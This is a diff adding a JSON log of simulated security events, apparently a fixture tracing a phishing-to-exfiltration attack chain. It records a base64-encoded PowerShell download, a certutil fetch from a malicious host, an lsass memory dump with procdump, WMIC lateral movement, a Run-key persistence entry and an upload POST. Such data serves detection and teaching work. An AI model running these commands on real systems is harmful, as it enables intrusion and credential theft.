@@ -1,0 +1,50 @@
+[
+    {
+        "timestamp": "2025-05-12T08:22:01Z",
+        "event_type": "email_opened",
+        "user": "m.jordan",
+        "attachment": "Q2_Report_2025.xlsm"
+    },
+    {
+        "timestamp": "2025-05-12T08:22:30Z",
+        "event_type": "process_creation",
+        "parent_process": "outlook.exe",
+        "process": "powershell.exe",
+        "command_line": "powershell -enc UwBjAHIAaQBwAHQALgBlAHgAZQAgACIAaAB0AHQAcAA6AC8ALwBkAGwAZQByAHMALgByAHUAbgAvAHMAaAB5AGQAcgBhAC4AZQB4AGUAIgA="
+    },
+    {
+        "timestamp": "2025-05-12T08:23:10Z",
+        "event_type": "file_download",
+        "tool": "certutil.exe",
+        "url": "http://malicious-site.ru/silent.exe",
+        "saved_as": "C:\\Users\\Public\\silent.exe"
+    },
+    {
+        "timestamp": "2025-05-12T08:25:12Z",
+        "event_type": "process_creation",
+        "process": "procdump64.exe",
+        "command_line": "procdump64.exe -ma lsass.exe lsass.dmp"
+    },
+    {
+        "timestamp": "2025-05-12T08:28:55Z",
+        "event_type": "lateral_movement",
+        "method": "wmic",
+        "source_host": "192.168.1.110",
+        "target_host": "192.168.1.150"
+    },
+    {
+        "timestamp": "2025-05-12T08:30:00Z",
+        "event_type": "registry_modification",
+        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svcUpdater",
+        "value": "C:\\Users\\Public\\silent.exe"
+    },
+    {
+        "timestamp": "2025-05-12T08:35:18Z",
+        "event_type": "network_connection",
+        "destination_ip": "185.203.45.12",
+        "port": 80,
+        "protocol": "HTTP",
+        "uri": "/api/upload",
+        "method": "POST"
+    }
+]
